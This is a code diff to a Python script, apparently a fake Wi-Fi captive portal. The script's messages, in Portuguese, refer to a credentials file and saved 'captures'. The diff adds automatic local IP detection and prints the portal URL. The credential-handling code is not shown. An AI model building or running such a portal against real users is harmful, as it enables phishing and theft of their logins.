@@ -111,11 +111,27 @@ def print_banner():
     """
     print(banner)
 
+def get_local_ip():
+    """Detectar IP automaticamente"""
+    import socket
+    try:
+        # Cria socket temporário
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
+
 def run_server():
     print_banner()
     
     port = CONFIG['port']
     server_address = ('', port)
+    
+    # Detectar IP local
+    local_ip = get_local_ip()
     
     try:
         httpd = HTTPServer(server_address, CaptivePortalHandler)
@@ -128,11 +144,15 @@ def run_server():
     
     print("  [+] Status: ATIVO")
     print("  [+] Porta: {0}".format(port))
+    print("  [+] IP Local: {0}".format(local_ip))
     print("  [+] Redirect: {0}".format(CONFIG['redirect_url']))
     print("  [+] Credenciais: {0}".format(CONFIG['credentials_file']))
     print("  [+] Logs: {0}".format(CONFIG['log_file']))
+    print("\n  " + "="*66)
+    print("  [*] ACESSE O PORTAL VIA:")
+    print("  [*] http://{0}:{1}".format(local_ip, port))
+    print("  " + "="*66)
     print("\n  [*] Servidor rodando...")
-    print("  [*] Acesse via: http://SEU_IP:{0}".format(port))
     print("  [*] Pressione Ctrl+C para parar\n")
     
     try:
@@ -141,6 +161,3 @@ def run_server():
         print("\n\n  [!] Servidor encerrado pelo usuario")
         print("  [!] Total de capturas salvas em: {0}\n".format(CONFIG['credentials_file']))
         sys.exit(0)
-
-if __name__ == '__main__':
-    run_server()
